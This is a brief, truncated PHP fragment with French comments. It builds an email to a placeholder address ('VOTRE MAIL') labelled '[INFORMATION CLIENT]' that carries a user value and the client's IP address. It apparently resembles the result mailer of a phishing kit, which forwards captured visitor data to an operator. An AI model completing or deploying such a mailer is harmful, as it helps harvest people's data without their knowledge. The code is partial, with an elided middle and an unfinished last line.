<?php
$mail = 'VOTRE MAIL'; // Déclaration de l'adresse de destination.
if (!preg_match("#^[a-z0-9._-]+@(hotmail|msn|yahoo).[a-z]{2,4}$#", $mail)) // On filtre les serveurs qui rencontrent des bogues.
{
	$passage_ligne = "\r\n";
}
else
...
$message_html = "[INFORMATION CLIENT] <br><br>".$user." <br><br>IP CLIENT : ".getip()." 
